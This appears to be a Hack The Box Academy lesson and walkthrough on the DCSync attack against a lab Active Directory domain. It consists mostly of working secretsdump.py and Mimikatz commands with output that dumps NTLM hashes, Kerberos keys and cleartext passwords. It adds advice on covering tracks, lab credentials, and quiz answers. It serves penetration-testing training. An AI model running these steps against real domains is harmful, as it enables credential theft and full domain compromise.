
---

Based on our work in the previous section, we now have control over the user `adunn` who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.

---

## Scenario Setup

In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host with the credentials `htb-student:Academy_student_AD!`. For the portion of this section that requires interaction from a Linux host (secretsdump.py) you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`. This could also likely be done all from Windows using a version of `secretsdump.exe` compiled for Windows as there are several GitHub repos of the Impacket toolkit compiled for Windows, or you can do that as a side challenge.

---

## What is DCSync and How Does it Work?

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

#### Viewing adunn's Replication Privileges through ADSI Edit

![ADSI Edit window showing DC=INLANEFREIGHT,DC=LOCAL properties with user Angela Dunn selected, displaying permissions for directory changes.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/adnunn_right_dcsync.png)

It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords. Here we have a standard domain user that has been granted the replicating permissions:

#### Using Get-DomainUser to View adunn's Group Membership

  DCSync

```powershell-session
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl


samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. We first get the user's SID in the above command and then check all ACLs set on the domain object (`"DC=inlanefreight,DC=local"`) using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user `adunn` (denoted in the below command as `$sid`) possesses these rights. The command confirms that the user does indeed have the rights.

#### Using Get-ObjectAcl to Check adunn's Replication Rights

  DCSync

```powershell-session
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

If we had certain rights over the user (such as [WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.

Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py  

adunn:SyncMaster757

```shell-session
xF1NN@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

d0wngrade:des-cbc-md5:d6fee0b62aa410fe
d0wngrade:dec-cbc-crc:d6fee0b62aa410fe
ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
svc_qualys:des-cbc-md5:f125ab34b53eb61c
forend:des-cbc-md5:e3c14adf9d8a04c1
[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

- Number and % of passwords cracked
- top 10 passwords
- Password length metrics
- Password re-use

reflect only active user accounts in the domain.

If we check the files created using the `-just-dc` flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.

#### Listing Hashes, Kerberos Keys, and Cleartext Passwords

  DCSync

```shell-session
xF1NN@htb[/htb]$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

While rare, we see accounts with these settings from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.

#### Viewing an Account with Reversible Encryption Password Storage Set

![Active Directory Users and Computers showing PROXYAGENT properties with account options and expiration settings.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/reverse_encrypt.png)

When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:

#### Enumerating Further using Get-ADUser

  DCSync

```powershell-session
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

We can see that one account, `proxyagent`, has the reversible encryption option set with PowerView as well:

#### Checking for Reversible Encryption Option using Get-DomainUser

  DCSync

```powershell-session
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

We will notice the tool decrypted the password and provided us with the cleartext value.

#### Displaying the Decrypted Password

  DCSync

```shell-session
xF1NN@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

I have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.

We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.

Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:

#### Using runas.exe

  DCSync

```cmd-session
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

From the newly spawned powershell session, we can perform the attack:

#### Performing the Attack with Mimikatz

  DCSync

```powershell-session
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```

---

## Moving On

In the next section, we'll see some ways to enumerate and take advantage of remote access rights that may be granted to a user we control. These methods include Remote Desktop Protocol (RDP), WinRM (or PsRemoting), and SQL Server admin access.

---

## Question 1

### "Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

  DCSync

```shell-session
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory and import `PowerView.ps1`::

Code: powershell

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

  DCSync

```powershell-session
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
```

Students then need to check for `Reversible Encryption` options assigned to users by using `Get-DomainUser`:

Code: powershell

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

  DCSync

```powershell-session
PS C:\Tools> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

Students will find out that the other user is `syncron`.

Answer: {hidden}

# DCSync

## Question 2

### "What is this user's cleartext password?"

Using the same `xfreerdp` connection established in the previous question, students need to open `Command Prompt` and use `runas` on the user `adunn` (providing the password `SyncMaster757` when prompted to):

Code: cmd

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

  DCSync

```powershell-session
C:\Users\htb-student>runas /netonly /user:INLANEFREIGHT\adunn powershell

Enter the password for INLANEFREIGHT\adunn:SyncMaster757
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

Students will then attain a `PowerShell` session as the user `adunn`:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_14.png)

Afterward, students will need to change directories to `C:\Tools\mimikatz\x64\`:

Code: powershell

```powershell
cd C:\Tools\mimikatz\x64\
```

  DCSync

```powershell-session
PS C:\Windows\System32> cd C:\Tools\mimikatz\x64\
```

And then, students need to run `mimikatz`:

Code: powershell

```powershell
.\mimikatz.exe
```

  DCSync

```powershell-session
 PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .###.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '###'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Students need to perform a `DCSync` attack using `mimikatz`:

Code: powershell

```powershell
lsadump::dcsync /user:INLANEFREIGHT\syncron
```

  DCSync

```powershell-session
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\syncron

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\syncron' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : syncron

** SAM ACCOUNT **

SAM Username         : syncron
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000280 ( ENCRYPTED_TEXT_PASSWORD_ALLOWED NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/2/2022 12:36:15 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-5617
Object Relative ID   : 5617

Credentials:
  Hash NTLM: d387b9d2d9f6dda51964194ad2376ee0
    ntlm- 0: d387b9d2d9f6dda51964194ad2376ee0
    ntlm- 1: cf3a5525ee9414229e66279623ed5c58
    lm  - 0: fed98466f2be61fb0409b5a71e2f977f
    lm  - 1: 7649a3cc283466005bd6988f90fd6a68

<SNIP>

* Packages *
    NTLM-Strong-NTOWF

* Primary:CLEARTEXT *
    Mycleart3xtP@ss!
```

From the output of `mimikatz`, students will find out that the cleartext password of the user `syncron` is `Mycleart3xtP@ss!`.

Answer: {hidden}

# DCSync

## Question 3

### "Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer."

Using the same `xfreerdp` connection established in the first question, students need to open `Command Prompt` and run the following `runas` command (providing the password `SyncMaster57` when prompted to):

Code: powershell

```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

  DCSync

```powershell-session
C:\Users\htb-student>runas /netonly /user:INLANEFREIGHT\adunn powershell

Enter the password for INLANEFREIGHT\adunn:SyncMaster757
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

Students will then attain a `PowerShell` session as the user `adunn`:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_14.png)

Afterward, they will need then to change directories to `C:\Tools\mimikatz\x64\`:

Code: powershell

```powershell
cd C:\Tools\mimikatz\x64\
```

  DCSync

```powershell-session
PS C:\Windows\System32> cd C:\Tools\mimikatz\x64\
```

And then run `mimikatz`:

Code: powershell

```powershell
.\mimikatz.exe
```

  DCSync

```powershell-session
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

 .###.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
.# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
# / \ #  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
# \ / #       > https://blog.gentilkiwi.com/mimikatz
'# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '###'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Students need to use `mimikatz` to perform a `DCSync` attack; students will find out that the `NTLM` hash is `4bb3b317845f0954200a6b0acc9b9f9a` for the user `khartsfield`:

Code: powershell

```powershell
lsadump::dcsync /user:INLANEFREIGHT\khartsfield
```

  DCSync

```powershell-session
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\khartsfield

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\khartsfield' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Kim Hartsfield

** SAM ACCOUNT **

SAM Username         : khartsfield
User Principal Name  : khartsfield@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 10:37:03 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1138
Object Relative ID   : 1138

Credentials:
  Hash NTLM: 4bb3b317845f0954200a6b0acc9b9f9a
    ntlm- 0: 4bb3b317845f0954200a6b0acc9b9f9a
    lm  - 0: 6d57ae87ad6df46fd47e67f5cbbf17ad

<SNIP>

mimikatz #
```

Answer: {hidden}